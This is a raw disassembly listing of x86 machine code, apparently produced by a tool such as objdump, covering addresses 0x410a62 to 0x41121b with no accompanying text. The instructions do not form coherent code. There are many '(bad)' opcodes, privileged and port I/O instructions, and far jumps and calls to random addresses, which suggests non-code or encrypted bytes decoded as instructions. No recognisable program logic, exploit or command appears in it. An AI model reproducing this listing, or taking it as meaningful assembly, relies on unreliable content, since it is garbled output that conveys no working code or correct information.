  410a62:	add    DWORD PTR [ebx],ecx
  410a64:	out    dx,eax
  410a65:	jo     0x410acd
  410a67:	ss jb  0x410ab9
  410a6a:	stc    
  410a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a6c:	(bad)  
  410a6d:	mov    ecx,0xc2a3b6f4
  410a72:	stc    
  410a73:	cmp    eax,0x83d08379
  410a78:	jns    0x410a31
  410a7a:	and    edx,DWORD PTR [edx+0x73]
  410a7d:	dec    ebx
  410a7e:	daa    
  410a7f:	jecxz  0x410aaa
  410a81:	(bad)  
  410a83:	or     al,0x80
  410a85:	(bad)  
  410a86:	fimul  DWORD PTR [ebx+edi*8+0x819cd68]
  410a8d:	jmp    0x410a19
  410a8f:	ins    DWORD PTR es:[edi],dx
  410a90:	adc    DWORD PTR [eax+ebp*4+0x24],ebp
  410a94:	jl     0x410aea
  410a96:	jmp    0x410ad2
  410a98:	les    eax,FWORD PTR [ebp+0x64863bf2]
  410a9e:	sbb    al,0xcd
  410aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410aa1:	push   edi
  410aa2:	fucomip st,st(3)
  410aa4:	mov    ebx,0x9cbd697
  410aa9:	(bad)  
  410aaa:	jmp    DWORD PTR [ebx-0x564d707e]
  410ab0:	(bad)  
  410ab2:	fldcw  WORD PTR [ebp+ecx*1+0x56cffd5e]
  410ab9:	jne    0x410adc
  410abb:	and    BYTE PTR [ecx+0x16805046],bh
  410ac1:	jnp    0x410a8b
  410ac3:	or     ah,BYTE PTR [ecx+0x19]
  410ac6:	adc    esi,DWORD PTR ds:0x8fb481
  410acc:	ins    DWORD PTR es:[edi],dx
  410acd:	in     al,0x78
  410acf:	test   eax,0x6fbbc86b
  410ad4:	iret   
  410ad5:	add    eax,0xa81ba642
  410ada:	mov    bh,0xe1
  410adc:	sahf   
  410add:	jbe    0x410b51
  410adf:	jle    0x410ae2
  410ae1:	in     al,dx
  410ae2:	imul   BYTE PTR [ecx+0x141f0a0c]
  410ae8:	push   ebx
  410ae9:	and    eax,0xbaa3f2f9
  410aee:	adc    esp,edi
  410af0:	mov    ebp,0x9a91c1de
  410af5:	jne    0x410ae6
  410af7:	dec    ecx
  410af8:	dec    eax
  410af9:	clc    
  410afa:	push   esi
  410afb:	call   0x989e02bf
  410b00:	test   al,0xaf
  410b02:	push   ecx
  410b03:	push   ds
  410b04:	or     ebp,edx
  410b06:	mov    ebp,0x43f8812e
  410b0b:	gs out 0x75,eax
  410b0e:	cmc    
  410b0f:	xchg   ecx,eax
  410b10:	xchg   DWORD PTR [esi-0x14],ebp
  410b13:	lahf   
  410b14:	pop    ss
  410b15:	icebp  
  410b16:	jns    0x410ad2
  410b18:	push   ss
  410b19:	or     dh,BYTE PTR ds:[ebp+0x285aeaab]
  410b20:	test   BYTE PTR [edx-0x1b8da5e3],0x2d
  410b27:	fld    st(5)
  410b29:	(bad)  
  410b2a:	mov    ecx,0x2de0fb8e
  410b2f:	imul   ecx,edi,0x3d243b0d
  410b35:	lds    edi,FWORD PTR [edi+0x20]
  410b38:	scas   al,BYTE PTR es:[edi]
  410b39:	push   ebp
  410b3a:	and    BYTE PTR [ebx-0x408a3f86],0xfd
  410b41:	cwde   
  410b42:	ror    DWORD PTR [eax+0x479bd101],1
  410b48:	mov    eax,ds:0x5c8545a
  410b4d:	jecxz  0x410b7f
  410b4f:	add    bh,BYTE PTR [edx+0x11efa874]
  410b55:	xchg   esp,eax
  410b56:	enter  0x5502,0xed
  410b5a:	in     al,0x8d
  410b5c:	lds    eax,FWORD PTR [edi+edx*8+0x7eaea7d7]
  410b63:	and    DWORD PTR [ebx-0x2be7de45],eax
  410b69:	mov    ds:0xe3f0fb17,eax
  410b6e:	bound  ecx,QWORD PTR [eax-0x610cdbfd]
  410b74:	stc    
  410b75:	sbb    eax,0x911445d0
  410b7a:	dec    eax
  410b7b:	loop   0x410b20
  410b7d:	push   ds
  410b7e:	dec    edx
  410b7f:	mov    DWORD PTR [ebx],esi
  410b81:	fucomi st,st(0)
  410b83:	push   0x6af580c
  410b88:	xchg   ebp,eax
  410b89:	xor    BYTE PTR [eax+0x6e02000c],bh
  410b8f:	stos   BYTE PTR es:[edi],al
  410b90:	popf   
  410b91:	add    al,0x54
  410b93:	jno    0x410bca
  410b95:	retf   0xc355
  410b98:	sub    al,0x45
  410b9a:	pop    ebx
  410b9b:	and    al,0xa8
  410b9d:	mov    al,0xb7
  410b9f:	jmp    0x8152ac7e
  410ba4:	or     ebx,DWORD PTR [ecx+0x21]
  410ba7:	mov    bh,0xb2
  410ba9:	xor    esi,DWORD PTR [ebp-0x358203c3]
  410baf:	jbe    0x410bc5
  410bb1:	jbe    0x410be9
  410bb3:	and    dh,BYTE PTR [ebx]
  410bb5:	mov    ecx,0xfe87a0ca
  410bba:	xchg   DWORD PTR ds:0x2329197c,ebp
  410bc0:	outs   dx,DWORD PTR ds:[esi]
  410bc1:	(bad)  
  410bc2:	shl    BYTE PTR [eax+ebx*1-0x11c133ae],cl
  410bc9:	jns    0x410c2f
  410bcb:	mov    ds:0x7530dae0,al
  410bd0:	imul   edi,DWORD PTR [edi+edi*4-0x3866acd3],0x892f1eb
  410bdb:	inc    esi
  410bdc:	mov    edx,DWORD PTR [esi+0x251f9f55]
  410be2:	out    dx,eax
  410be3:	lea    ebx,[edx+0x22]
  410be6:	dec    esp
  410be7:	or     eax,eax
  410be9:	ret    0x8a6d
  410bec:	and    BYTE PTR [ebp-0x33],0xda
  410bf0:	iret   
  410bf1:	hlt    
  410bf2:	fcmovnb st,st(2)
  410bf4:	inc    esi
  410bf5:	div    DWORD PTR [edi-0x653a275]
  410bfb:	sub    DWORD PTR [ebx-0x6c],esp
  410bfe:	pop    es
  410bff:	pop    eax
  410c00:	mov    ebp,0xd5b78b1
  410c05:	xchg   edi,eax
  410c06:	jae    0x410c63
  410c08:	ins    DWORD PTR es:[edi],dx
  410c09:	add    al,BYTE PTR [edi+0x1356a8ab]
  410c0f:	inc    ebx
  410c10:	fld    QWORD PTR [ebp+0x68]
  410c14:	push   ss
  410c15:	ja     0x410c27
  410c17:	fmul   DWORD PTR [esi-0x36]
  410c1a:	cld    
  410c1b:	xchg   esi,eax
  410c1c:	daa    
  410c1d:	scas   eax,DWORD PTR es:[edi]
  410c1e:	push   ds
  410c1f:	pop    ebx
  410c20:	stos   BYTE PTR es:[edi],al
  410c21:	pop    ebp
  410c22:	fst    DWORD PTR [ebp-0x40]
  410c25:	test   BYTE PTR [edx],cl
  410c27:	retf   
  410c28:	rcr    DWORD PTR [ebx-0x2730ddac],0x5d
  410c2f:	cdq    
  410c30:	jbe    0x410bb7
  410c32:	(bad)  
  410c33:	mov    esi,0x9f39071
  410c38:	cmp    esi,DWORD PTR [ebp-0x6a244799]
  410c3e:	and    eax,0x7b4eb4f6
  410c43:	nop
  410c44:	sbb    al,0x3e
  410c46:	inc    eax
  410c47:	jcxz   0x410caa
  410c4a:	add    al,0xf0
  410c4c:	dec    ebp
  410c4d:	inc    esp
  410c4e:	jno    0x410c02
  410c50:	cmp    BYTE PTR [edi-0x66],al
  410c53:	inc    ebx
  410c54:	ret    
  410c55:	pop    ss
  410c56:	out    0x7b,eax
  410c58:	pop    ecx
  410c59:	push   esp
  410c5a:	cdq    
  410c5b:	adc    BYTE PTR [eax+ebp*2-0x48159c02],0xac
  410c63:	mov    ebp,0x67358a4
  410c68:	bound  edi,QWORD PTR [edi+eiz*1-0x5b343daf]
  410c6f:	pop    ebx
  410c70:	gs pop es
  410c72:	(bad)  
  410c73:	sbb    eax,0x6bff2374
  410c78:	jae    0x410cb0
  410c7a:	ss cwde 
  410c7c:	pop    es
  410c7d:	sbb    edx,DWORD PTR [edx]
  410c7f:	xchg   esi,eax
  410c80:	in     al,dx
  410c81:	xchg   ecx,eax
  410c82:	hlt    
  410c83:	inc    esp
  410c84:	push   ss
  410c85:	and    esi,edi
  410c87:	data16 hlt 
  410c89:	jmp    0xe712:0x4a1606b6
  410c90:	das    
  410c91:	dec    eax
  410c92:	or     al,0xb3
  410c94:	mov    cl,0x9a
  410c96:	imul   eax,ebp,0x63
  410c99:	sbb    edx,DWORD PTR [esi-0x51]
  410c9c:	mov    ebx,0xa2489aa3
  410ca1:	xor    bl,al
  410ca3:	pusha  
  410ca4:	inc    ecx
  410ca5:	mov    bl,BYTE PTR [ecx-0x127d295d]
  410cab:	add    ebx,DWORD PTR [edi+0x87fdb8a]
  410cb1:	rcr    BYTE PTR [ecx+eax*2+0x733ea0f4],cl
  410cb8:	fidivr DWORD PTR [edx]
  410cba:	adc    dl,BYTE PTR [ebx]
  410cbc:	push   esp
  410cbd:	loop   0x410cb8
  410cbf:	pop    ds
  410cc0:	cdq    
  410cc1:	daa    
  410cc2:	das    
  410cc3:	jg     0x410d18
  410cc5:	fisttp DWORD PTR [edi-0x4f]
  410cc8:	sub    DWORD PTR [edx+0x16ad8823],ebx
  410cce:	cld    
  410ccf:	loopne 0x410d1d
  410cd1:	ja     0x410d02
  410cd3:	push   ecx
  410cd4:	lock lods al,BYTE PTR ds:[esi]
  410cd6:	push   eax
  410cd7:	cwde   
  410cd8:	jmp    0x7089:0x45510a54
  410cdf:	and    ah,BYTE PTR [edx]
  410ce1:	mov    WORD PTR [eax-0x328f2f28],ss
  410ce7:	or     al,0x40
  410ce9:	scas   eax,DWORD PTR es:[edi]
  410cea:	les    esi,FWORD PTR [esi+0x47bf616]
  410cf0:	mov    al,0x3b
  410cf2:	stos   BYTE PTR es:[edi],al
  410cf3:	data16 in al,dx
  410cf5:	test   BYTE PTR [ebx-0x9],bh
  410cf8:	dec    DWORD PTR [edi+0x3d431d49]
  410cfe:	xchg   esp,eax
  410cff:	push   DWORD PTR [ebx]
  410d01:	enter  0xe390,0xa2
  410d05:	or     eax,0xc6022e9d
  410d0a:	inc    esp
  410d0b:	in     al,0x93
  410d0d:	dec    ebp
  410d0e:	inc    edx
  410d0f:	aad    0x4f
  410d11:	adc    bh,dh
  410d13:	mov    eax,0xe07ad3e7
  410d18:	pop    ss
  410d19:	cwde   
  410d1a:	scas   eax,DWORD PTR es:[edi]
  410d1b:	ins    BYTE PTR es:[edi],dx
  410d1c:	cmp    DWORD PTR [ecx+0x42],eax
  410d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d20:	test   al,0xc1
  410d22:	sub    DWORD PTR es:[ecx-0x3f],edx
  410d26:	sbb    esp,DWORD PTR [ebx]
  410d28:	fisub  DWORD PTR [eax-0x1d]
  410d2b:	ret    
  410d2c:	add    esp,DWORD PTR [esi-0x5a]
  410d2f:	and    eax,0xbfad6f78
  410d34:	mov    bl,0x26
  410d36:	ficomp DWORD PTR [edx]
  410d38:	out    0x39,al
  410d3a:	cmp    eax,0x6a97d488
  410d3f:	fld    DWORD PTR [edi+0x19ce23da]
  410d45:	cmp    BYTE PTR [ebp+ebp*4+0x48],ch
  410d49:	push   ss
  410d4a:	stos   BYTE PTR es:[edi],al
  410d4b:	mov    ds:0xa7e6fc04,eax
  410d50:	paddw  mm3,QWORD PTR ds:0x57a5cfea
  410d57:	jmp    0x3beebc9b
  410d5c:	inc    DWORD PTR [eax+0x2]
  410d5f:	xchg   ebp,eax
  410d60:	jmp    0xb2a2:0xf2a6c49b
  410d67:	repz cmp DWORD PTR [ecx-0x61],esp
  410d6b:	pop    ss
  410d6c:	adc    ebx,DWORD PTR [eax-0x47e12467]
  410d72:	push   DWORD PTR [edx-0x12463850]
  410d78:	stos   BYTE PTR es:[edi],al
  410d79:	push   es
  410d7a:	aam    0xbd
  410d7c:	jl     0x410d7a
  410d7e:	ins    BYTE PTR es:[edi],dx
  410d7f:	sbb    cl,BYTE PTR [esi]
  410d81:	dec    edi
  410d82:	(bad)  
  410d83:	and    eax,0xe4b7b42a
  410d88:	lds    eax,FWORD PTR [ebp-0x5f]
  410d8b:	scas   al,BYTE PTR es:[edi]
  410d8c:	sub    cl,ah
  410d8e:	jae    0x410daf
  410d90:	jne    0x410dd4
  410d92:	mov    edx,0xbee4f586
  410d97:	stos   BYTE PTR es:[edi],al
  410d98:	nop
  410d99:	dec    ebx
  410d9a:	sbb    cl,cl
  410d9c:	push   esi
  410d9d:	fiadd  WORD PTR [ebx]
  410d9f:	popa   
  410da0:	ret    
  410da1:	add    eax,0x72523fc9
  410da6:	sub    ch,BYTE PTR [eax+0x7]
  410da9:	mov    al,ds:0x22c820d0
  410dae:	stc    
  410daf:	sbb    eax,0x624be481
  410db4:	scas   eax,DWORD PTR es:[edi]
  410db5:	js     0x410d81
  410db7:	ins    BYTE PTR es:[edi],dx
  410db8:	and    al,0x2f
  410dba:	ret    
  410dbb:	or     DWORD PTR [eax],edx
  410dbd:	or     DWORD PTR [ebx+ecx*4-0x45],0xffffffbf
  410dc2:	or     eax,0xd6b1e8de
  410dc7:	or     al,0x5c
  410dc9:	dec    edx
  410dca:	out    0x6c,eax
  410dcc:	mov    dh,0xe6
  410dce:	jecxz  0x410deb
  410dd0:	dec    edx
  410dd1:	rcr    BYTE PTR [edx],cl
  410dd3:	xchg   esp,eax
  410dd4:	and    DWORD PTR [ecx+0x1ff7c024],ebp
  410dda:	mov    bh,0xd5
  410ddc:	fcomp  DWORD PTR [edx]
  410dde:	sahf   
  410ddf:	jge    0x410dc1
  410de1:	(bad)  
  410de2:	icebp  
  410de3:	aam    0x62
  410de5:	sub    BYTE PTR [eax],bh
  410de7:	and    bh,BYTE PTR [eax+esi*1-0x71]
  410deb:	sub    BYTE PTR [edi+0x0],al
  410dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410def:	pop    ecx
  410df0:	adc    dh,BYTE PTR [ecx+0x53ee4154]
  410df6:	sub    ecx,DWORD PTR [ecx+esi*8]
  410df9:	in     eax,dx
  410dfa:	cli    
  410dfb:	fisub  WORD PTR ds:0x1dddd608
  410e01:	popa   
  410e02:	push   ss
  410e03:	ret    0x3843
  410e06:	or     al,0xc1
  410e08:	jle    0x410dd9
  410e0a:	daa    
  410e0b:	stc    
  410e0c:	inc    edi
  410e0d:	mov    dh,0x49
  410e0f:	jo     0x410de0
  410e11:	add    BYTE PTR [eax+0x3fa86300],ch
  410e17:	sahf   
  410e18:	xchg   edx,eax
  410e19:	dec    ebx
  410e1a:	cwde   
  410e1b:	jnp    0x410e5c
  410e1d:	sar    bl,cl
  410e1f:	cmp    edx,DWORD PTR [edx+esi*8-0x27]
  410e23:	ins    BYTE PTR es:[edi],dx
  410e24:	xchg   DWORD PTR [ebp+esi*4-0x253cfc27],ebp
  410e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e2c:	dec    ecx
  410e2d:	scas   al,BYTE PTR es:[edi]
  410e2e:	retf   
  410e2f:	js     0x410db8
  410e31:	xor    edx,DWORD PTR [esi-0x7c]
  410e34:	int3   
  410e35:	pop    ds
  410e36:	fstp   DWORD PTR [eax-0x38]
  410e39:	inc    eax
  410e3a:	xor    al,0xcf
  410e3c:	outs   dx,DWORD PTR ds:[esi]
  410e3d:	int    0x81
  410e3f:	and    eax,0x63c2482a
  410e44:	jno    0x410e1d
  410e46:	add    ecx,eax
  410e48:	jmp    0xec69:0x2fe62bbd
  410e4f:	sbb    ecx,ebp
  410e51:	sbb    ebp,DWORD PTR [ebx]
  410e53:	fild   QWORD PTR [edi+0x4b5c737b]
  410e59:	das    
  410e5a:	fist   DWORD PTR [eax-0xcfac370]
  410e60:	shl    BYTE PTR [edi-0x28086fd7],cl
  410e66:	callw  0x48f2
  410e6a:	mov    WORD PTR [edi+0x4229e693],ss
  410e70:	outs   dx,DWORD PTR ds:[esi]
  410e71:	loope  0x410e04
  410e73:	je     0x410ed6
  410e75:	les    ebx,FWORD PTR ds:0x2bca64eb
  410e7b:	push   es
  410e7c:	jle    0x410efd
  410e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e7f:	daa    
  410e80:	ret    0x1988
  410e83:	(bad)  
  410e84:	jbe    0x410ede
  410e86:	pop    esi
  410e87:	jo     0x410eb1
  410e89:	pop    ebx
  410e8a:	je     0x410e3b
  410e8c:	pop    edi
  410e8d:	inc    edi
  410e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e8f:	in     eax,0x76
  410e91:	push   ss
  410e92:	ds jno 0x410e1c
  410e95:	jl     0x410e28
  410e97:	sub    eax,0x8db9f21e
  410e9c:	mov    WORD PTR [ecx+edx*8],cs
  410e9f:	jle    0x410e72
  410ea1:	mov    ds:0x61a45985,eax
  410ea6:	sub    al,0x6d
  410ea8:	inc    ebx
  410ea9:	(bad)  [ecx-0x25abcf9d]
  410eaf:	push   es
  410eb0:	mov    eax,ds:0x527010ee
  410eb5:	mov    bh,BYTE PTR [eax]
  410eb7:	shr    esi,0x8c
  410eba:	stc    
  410ebb:	jl     0x410ee5
  410ebd:	push   edi
  410ebe:	mov    bl,0xf2
  410ec0:	sbb    cl,BYTE PTR [esi+0x521e4d0d]
  410ec6:	xor    DWORD PTR [ecx-0x50f317bd],ebp
  410ecc:	push   0x85dd9460
  410ed1:	and    ebp,DWORD PTR [ecx]
  410ed3:	enter  0x806f,0xee
  410ed7:	xor    al,0x5c
  410ed9:	and    ch,BYTE PTR [eax]
  410edb:	inc    esi
  410edc:	xor    ah,BYTE PTR [ecx+0x6b14032f]
  410ee2:	dec    ebp
  410ee3:	mov    ah,0x7
  410ee5:	xchg   esp,eax
  410ee6:	dec    edx
  410ee7:	test   al,0xe5
  410ee9:	or     al,0x9
  410eeb:	js     0x410f11
  410eed:	mov    al,ds:0xa680476e
  410ef2:	pop    es
  410ef3:	xchg   ebp,eax
  410ef4:	jnp    0x410e85
  410ef6:	sbb    al,0x48
  410ef8:	lea    edx,[edx-0x6f0fd46c]
  410efe:	sti    
  410eff:	dec    ecx
  410f00:	push   cs
  410f01:	push   esp
  410f02:	mov    eax,ds:0x4b7e8af5
  410f07:	fnstcw WORD PTR [ebp+eiz*2+0x7e]
  410f0b:	repz int 0x9a
  410f0e:	outs   dx,BYTE PTR ds:[esi]
  410f0f:	mov    dl,al
  410f11:	fdivrp st(7),st
  410f13:	mov    al,0x86
  410f15:	inc    eax
  410f16:	test   DWORD PTR [ebx],0xc973daa0
  410f1c:	out    dx,al
  410f1d:	loope  0x410ed0
  410f1f:	pop    es
  410f20:	push   eax
  410f21:	mov    eax,0x2c5559fd
  410f26:	adc    ecx,edi
  410f28:	mov    ds:0x1c3af658,al
  410f2d:	jmp    0x410f1c
  410f2f:	mov    dl,0xad
  410f31:	cld    
  410f32:	xchg   ebx,eax
  410f33:	xchg   BYTE PTR [edx-0x2e],bl
  410f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f37:	mov    bh,0x19
  410f39:	out    0xd9,al
  410f3b:	call   0xf1a0c6ec
  410f40:	loopne 0x410f9d
  410f42:	neg    ecx
  410f44:	sbb    ebp,DWORD PTR [eax-0x7f8b9dca]
  410f4a:	sbb    BYTE PTR [ebx+eax*2],cl
  410f4d:	scas   al,BYTE PTR es:[edi]
  410f4e:	xor    BYTE PTR [bx+di+0x3a77],ch
  410f53:	inc    esi
  410f54:	leave  
  410f55:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  410f57:	sbb    DWORD PTR [ebp+0x26fe82a7],esi
  410f5d:	(bad)  
  410f5f:	mov    cl,0xf3
  410f61:	enter  0x25b,0x22
  410f65:	es push 0x5d6d55a0
  410f6b:	iret   
  410f6c:	stos   BYTE PTR es:[edi],al
  410f6d:	push   esp
  410f6e:	loopne 0x410fca
  410f70:	jmp    0x75f5:0x6d25c2f5
  410f77:	test   DWORD PTR [ecx+0x727cf4b2],ebp
  410f7d:	inc    edx
  410f7e:	out    0x7d,eax
  410f80:	call   0x628d:0x8fde2841
  410f87:	pop    edx
  410f88:	(bad)  
  410f89:	ins    BYTE PTR es:[edi],dx
  410f8a:	or     DWORD PTR [eax-0x44],edi
  410f8d:	gs nop
  410f8f:	pop    esp
  410f90:	cli    
  410f91:	int3   
  410f92:	pop    edx
  410f93:	push   eax
  410f94:	mov    ch,BYTE PTR [ebp+0x52]
  410f97:	sar    BYTE PTR [ecx],1
  410f99:	or     al,0xaf
  410f9b:	jle    0x410fa2
  410f9d:	out    0x76,al
  410f9f:	das    
  410fa0:	ror    ebx,cl
  410fa2:	lods   eax,DWORD PTR ds:[esi]
  410fa3:	loop   0x410f48
  410fa5:	jmp    0x9a2a:0x529612ee
  410fac:	or     BYTE PTR [edi-0x18a204c5],0x7c
  410fb3:	mov    ah,0x64
  410fb5:	sbb    BYTE PTR [esi-0x22595f59],bl
  410fbb:	mov    BYTE PTR [edx+0x16189f2c],al
  410fc1:	hlt    
  410fc2:	sub    dh,ch
  410fc4:	push   ebx
  410fc5:	sub    DWORD PTR [ebx+0x6b],eax
  410fc8:	cli    
  410fc9:	jmp    0x410fd4
  410fcb:	dec    edx
  410fcc:	rcr    ebp,1
  410fce:	xor    ecx,DWORD PTR [ecx+eax*1+0x29f70168]
  410fd5:	sub    DWORD PTR [eax+0x69dd2202],ebp
  410fdb:	inc    eax
  410fdc:	nop
  410fdd:	mov    ecx,0x452fc951
  410fe2:	rol    BYTE PTR ds:0xcbe95b9f,cl
  410fe8:	push   eax
  410fe9:	xchg   edi,eax
  410fea:	sub    edi,DWORD PTR [ebp-0x37]
  410fed:	sub    al,0xe4
  410fef:	jge    0x41102e
  410ff1:	je     0x41101b
  410ff3:	pxor   mm4,mm0
  410ff6:	push   edx
  410ff7:	push   ebx
  410ff8:	push   ebx
  410ff9:	dec    esp
  410ffa:	cmp    BYTE PTR [edx-0x2b],0x1e
  410ffe:	mov    ebp,DWORD PTR gs:[eax]
  411001:	ins    BYTE PTR es:[edi],dx
  411002:	jne    0xf9a768d7
  411008:	in     al,0xff
  41100a:	jae    0x41107f
  41100c:	mov    esp,0x8e412a3e
  411011:	dec    ecx
  411012:	mov    al,0x68
  411014:	jbe    0x41100b
  411016:	xchg   edx,eax
  411017:	pusha  
  411018:	or     al,0x63
  41101a:	cld    
  41101b:	cmp    DWORD PTR [ebp+0x4d],0x77ae2543
  411022:	aaa    
  411023:	stos   BYTE PTR es:[edi],al
  411024:	or     al,0xc
  411026:	or     DWORD PTR [eax+0x17],eax
  411029:	jle    0x410fdb
  41102b:	or     ah,bl
  41102d:	lahf   
  41102e:	jge    0x41101a
  411030:	jle    0x41108c
  411032:	or     al,0xab
  411034:	xchg   edx,eax
  411035:	xor    al,0x10
  411037:	xlat   BYTE PTR ds:[ebx]
  411038:	dec    edi
  411039:	hlt    
  41103a:	out    0x1d,al
  41103c:	mov    ds:0x62d22725,eax
  411041:	mov    ecx,0x4e495689
  411046:	sub    BYTE PTR [ebp-0x6fc27f74],bh
  41104c:	cmp    al,0xb3
  41104e:	lock sbb BYTE PTR [edi+0x3],dh
  411052:	and    eax,0xb416fde6
  411057:	je     0x410fdb
  411059:	mov    eax,ds:0x27b4b9e4
  41105e:	(bad)  
  411060:	pop    eax
  411061:	and    BYTE PTR [esi+0x5f],cl
  411064:	xor    al,0x19
  411066:	push   eax
  411067:	jne    0x4110b0
  411069:	hlt    
  41106a:	aas    
  41106b:	mov    ds:0xa9207dc6,eax
  411070:	and    al,0x48
  411072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411073:	pop    ecx
  411074:	and    BYTE PTR [edi-0x114a8718],bl
  41107a:	cmp    al,0x93
  41107c:	out    0xbd,al
  41107e:	int3   
  41107f:	dec    esi
  411080:	mov    edx,0xc9224ef7
  411085:	adc    ah,BYTE PTR [edi+esi*4-0x1de58b78]
  41108c:	ins    DWORD PTR es:[edi],dx
  41108d:	arpl   WORD PTR [edi-0x2e],ax
  411090:	loopne 0x411069
  411092:	jmp    0x4110a6
  411094:	retf   0x506a
  411097:	adc    eax,0x25097d3d
  41109c:	and    edi,DWORD PTR [ecx]
  41109e:	ret    
  41109f:	push   esp
  4110a0:	cli    
  4110a1:	test   DWORD PTR [edi+0x50],esp
  4110a4:	dec    esp
  4110a5:	inc    ebx
  4110a6:	mov    edi,0x35320573
  4110ab:	adc    ecx,edx
  4110ad:	js     0x41110b
  4110af:	arpl   ax,bp
  4110b1:	inc    ebx
  4110b2:	ror    BYTE PTR [ecx],0xb7
  4110b5:	in     eax,0xc9
  4110b7:	clc    
  4110b8:	or     dh,BYTE PTR [edi]
  4110ba:	xor    eax,0xd7eff9a6
  4110bf:	sbb    DWORD PTR [edi+0x441a517],ebx
  4110c5:	pop    es
  4110c6:	cmc    
  4110c7:	neg    DWORD PTR [esi-0x77281eaa]
  4110cd:	and    edx,0xe09cbde5
  4110d3:	stc    
  4110d4:	pushf  
  4110d5:	fdivr  QWORD PTR [ecx+edi*4+0x77b33c29]
  4110dc:	push   esi
  4110dd:	and    ebx,ebp
  4110df:	adc    DWORD PTR [ebx+0x3a45feb8],0xffffff8b
  4110e6:	lods   eax,DWORD PTR ds:[esi]
  4110e7:	jae    0x411144
  4110e9:	shr    BYTE PTR [ecx+0x4ad5f353],cl
  4110ef:	les    ebx,FWORD PTR ds:0x49564a00
  4110f5:	mov    esp,0xc8b912de
  4110fa:	xchg   esi,eax
  4110fb:	and    DWORD PTR [edx],ebp
  4110fd:	int3   
  4110fe:	xchg   edi,eax
  4110ff:	loopne 0x411164
  411101:	jmp    0xce132b80
  411106:	mov    ah,0xbf
  411108:	out    dx,eax
  411109:	nop
  41110a:	mov    WORD PTR [ebp+0x26],?
  41110d:	mov    DWORD PTR [edx-0x1c],ebx
  411110:	adc    al,0xc3
  411113:	(bad)  
  411114:	lock imul esi,DWORD PTR [ebp+0x69],0x3976cad3
  41111c:	pop    ds
  41111d:	dec    esp
  41111e:	pop    esi
  41111f:	fmul   QWORD PTR [edx+0x2662be6b]
  411125:	lock add DWORD PTR [ecx+0x22f64822],0x41
  41112d:	in     al,0xcc
  41112f:	fld    st(4)
  411131:	dec    DWORD PTR [edx]
  411133:	(bad)  
  411134:	ficomp DWORD PTR [edx+0x6f]
  411137:	stc    
  411138:	loopne 0x41112d
  41113a:	sbb    esi,0xffffffc8
  41113d:	ins    DWORD PTR es:[edi],dx
  41113e:	sbb    al,bl
  411140:	shr    edx,1
  411142:	xor    edx,DWORD PTR [ebx+0x2e]
  411145:	inc    ebp
  411146:	jecxz  0x411176
  411148:	loop   0x4111b7
  41114a:	or     DWORD PTR [edx+0x4a],0xa098ddb6
  411151:	sub    BYTE PTR [esi],dh
  411153:	ret    0x47a6
  411156:	scas   eax,DWORD PTR es:[edi]
  411157:	repnz out dx,al
  411159:	or     ebx,ebp
  41115b:	or     ebx,DWORD PTR [edx]
  41115d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41115e:	and    ebp,DWORD PTR [esi+0x445b1605]
  411164:	mov    es,WORD PTR [ebp-0x56]
  411167:	jmp    FWORD PTR [edi+ecx*1-0x12180f2d]
  41116e:	outs   dx,BYTE PTR ds:[esi]
  41116f:	mov    dh,0x16
  411171:	lods   eax,DWORD PTR ds:[esi]
  411172:	out    0x80,eax
  411174:	mov    dh,0xb
  411176:	xor    al,0x57
  411178:	mov    ds:0x1ca3d99c,eax
  41117d:	in     eax,0xd9
  41117f:	popf   
  411180:	dec    ecx
  411181:	test   eax,0xb24343e6
  411186:	xchg   esi,eax
  411187:	adc    esp,DWORD PTR [ecx-0x18]
  41118a:	pop    ebp
  41118b:	stos   DWORD PTR es:[edi],eax
  41118c:	idiv   al
  41118e:	add    bl,cl
  411190:	lods   eax,DWORD PTR ds:[esi]
  411191:	nop    DWORD PTR [edi+0x62]
  411195:	arpl   WORD PTR [esi+eax*4+0xbc74227],di
  41119c:	jae    0x4111fb
  41119e:	ins    DWORD PTR es:[edi],dx
  41119f:	and    dl,dl
  4111a1:	sub    eax,DWORD PTR [esi-0x710eaa21]
  4111a7:	push   ss
  4111a8:	mov    WORD PTR [esi],?
  4111aa:	xor    DWORD PTR [eax],ebp
  4111ac:	int    0x54
  4111ae:	jmp    0x64c80149
  4111b3:	and    al,0xc4
  4111b5:	cmp    BYTE PTR [ebx-0x60],dl
  4111b8:	lahf   
  4111b9:	mov    eax,0x83d80d13
  4111be:	xor    ebp,ebp
  4111c0:	out    dx,eax
  4111c1:	sbb    edi,ebx
  4111c3:	inc    edi
  4111c4:	into   
  4111c5:	lods   al,BYTE PTR ds:[esi]
  4111c6:	jmp    0x748d:0x85d8224
  4111cd:	outs   dx,BYTE PTR ds:[esi]
  4111ce:	icebp  
  4111cf:	add    DWORD PTR [esi],edi
  4111d1:	push   0xffffffb4
  4111d3:	rcl    dh,0x0
  4111d6:	xchg   ebp,eax
  4111d7:	dec    esp
  4111d8:	sub    DWORD PTR [ebx],esp
  4111da:	daa    
  4111db:	(bad)  
  4111dc:	loopne 0x4111df
  4111de:	fwait
  4111df:	xlat   BYTE PTR ds:[ebx]
  4111e0:	and    eax,0xf6206a08
  4111e5:	or     ebp,DWORD PTR [edx+0x1ee968c1]
  4111eb:	iret   
  4111ec:	xor    WORD PTR [ecx+0xd152baa],si
  4111f3:	test   edi,edi
  4111f5:	or     ebx,ebp
  4111f7:	stc    
  4111f8:	fstp   st(1)
  4111fa:	test   eax,0x4e5f49cb
  4111ff:	add    eax,0xa25c7b18
  411204:	in     eax,dx
  411205:	mov    eax,ds:0x1f740dba
  41120a:	adc    dh,al
  41120c:	rcl    BYTE PTR [ecx+0x72],1
  41120f:	outs   dx,BYTE PTR ds:[esi]
  411210:	pop    esi
  411211:	pusha  
  411212:	fldcw  WORD PTR [ecx]
  411214:	stos   BYTE PTR es:[edi],al
  411215:	sar    BYTE PTR [edi],0xb2
  411218:	sub    al,0xc9
  41121a:	push   ecx
  41121b:	jg     0x4111b7
